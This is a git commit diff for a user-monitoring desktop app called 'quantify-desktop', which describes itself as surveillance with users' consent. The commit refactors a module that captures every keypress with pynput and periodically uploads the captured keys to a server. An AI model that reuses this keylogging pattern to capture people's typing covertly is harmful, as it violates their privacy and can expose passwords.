561ec8482fb103ede13f8eb7a8ed1264a9f2eade
breitburg <contact@breitburg.me>
2019-07-18 16:23:08 +0300

    Small keyboard refactoring

--- desktop/modules/keyboard.py
+++ desktop/modules/keyboard.py
@@ -14,15 +14,8 @@ class KeyboardModule(BaseModule):
 
         # Создаем поток для трекинга нажатий на клавиатуру
         # передаем в функцию массив нажатых клавиш
-        keys_thread = Thread(target=self.key_tracking, args=(self.key_events, ))
+        keys_thread = Thread(target=key_tracking, args=(self.key_events,))
         keys_thread.start()
-
-    @staticmethod
-    def key_tracking(key_events):
-        # Метод обрабатывающий нажатие клавиш
-        # при получении события нажатия на кнопку добавляем данные в массив
-        with Listener(on_press=lambda key: key_events.append({'time': time(), 'button': f'{key}'})) as listener:
-            listener.join()
 
     def update(self):
         # Метод отправки данных на сервер
@@ -32,3 +25,10 @@ class KeyboardModule(BaseModule):
         except Exception as exception:
             info(f'Возникла проблема при подключению: {exception}')
         self.key_events.clear()  # Отчищаем массив нажатых клавиш
+
+
+def key_tracking(key_events):
+    # Метод обрабатывающий нажатие клавиш
+    # при получении события нажатия на кнопку добавляем данные в массив
+    with Listener(on_press=lambda key: key_events.append(dict(time=time(), button=str(key)))) as listener:
+        listener.join()
--- setup.py
+++ setup.py
@@ -1,12 +1,8 @@
 from setuptools import setup, find_packages
-from sys import argv
-
-if argv[len(argv) - 1] != 'install':
-    print('ahhsa')
 
 setup(
     name='quantify-desktop',
-    version='1.0.7',
+    version='1.0.8',
     description='Слежка за пользователями с их согласия',
     packages=find_packages(),
     include_package_data=True,
